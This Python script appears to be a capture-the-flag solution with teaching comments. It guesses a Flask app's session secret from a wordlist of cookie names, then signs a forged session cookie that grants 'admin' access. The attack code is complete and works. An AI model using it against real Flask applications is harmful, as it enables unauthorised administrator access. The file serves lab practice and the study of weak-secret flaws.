import hashlib  # Used to specify the hashing algorithm (here SHA1)
from itsdangerous import URLSafeTimedSerializer  # A basic class for signing and verifying data with built-in timestamp and URL-safe encoding
from itsdangerous.exc import BadTimeSignature  # Exception that occurs when signature or timestamp verification fails
from flask.sessions import TaggedJSONSerializer  # Flask's default serializer for session data (tagged JSON)

def flask_cookie(secret_key, cookie_str, operation):
    # This function is a simplified version of the SecureCookieSessionInterface: https://github.com/pallets/flask/blob/020331522be03389004e012e008ad7db81ef8116/src/flask/sessions.py#L304.
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1 # it's just like text that will be appended to HMAC
    }
    # Here, a key is generated for signing serialized data:
    # 1. A unique signing key is generated (secret_key+salt(cookie-session)+signer_kwargs)
    # 2. HMAC is calculated from Payload (Serialized data + timestamp/metadata)
    #      using the generated key (s) and the SHA1 hash function (digest_method=hashlib.sha1). Signature = HMAC(secret_key, Payload)
    # 3. Payload and the resulting HMAC are encoded in Base64 for secure transmission in HTTP headers
    # 4. The encoded Payload and encoded HMAC are combined using a dot
    # The above actions are performed by the s.dumps method
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    if operation == "decode":
        # print(" s.loads() throws BadTimeSignature")
        # The s.loads method separates the Payload for Timestamp verification (if the time is invalid, it throws BadTimeSignature)
        # generates a new HMAC based on the keys that the for possible_secret_key in possible_keys loop iterates over:
        # !! The recalculated HMAC is compared to the decoded Signature that was taken directly from the input string cookie_str
        return s.loads(cookie_str)
    else:  #if operation == "encode":
        # print(f"s.dumps() = {cookie_str}")
        return s.dumps(cookie_str)

# The list of possible secret keys used by the app.
possible_keys = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]

# An encoded cookie pulled from the live application that can be used to guess the secret key.
cookie_str = "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aASsiA.UZbs631WPFgGGsVh7UQqzOIXHHk"

# For each possible key try to decode the cookie.
for possible_secret_key in possible_keys:
    try:
        # if the URLSafeTimedSerializer.loads() method throws a BadTimeSignature exception,
        # then the lower except block catches it and continues to iterate through the signature keys in possible_keys

        # otherwise URLSafeTimedSerializer.loads() RETURNS DECODED session data (key stored in possible_secret_key)
        cookie_decoded = flask_cookie(possible_secret_key, cookie_str, "decode")
    except BadTimeSignature:
        # If the decoding fails then try the next key.
        continue
    secret_key = possible_secret_key
    # Break the loop when we have the corret key.
    break

print("Secret Key: %s" % secret_key)

# The admin cookie has the `very_auth` value set to `admin`, which can be seen on line 46 of the server.py code.
admin_cookie = {"very_auth": "admin"}
# Encode the cookie used the `SecureCookieSessionInterface` logic.
admin_cookie_encoded = flask_cookie(secret_key, admin_cookie, "encode")

print("Admin Cookie: %s" % admin_cookie_encoded)
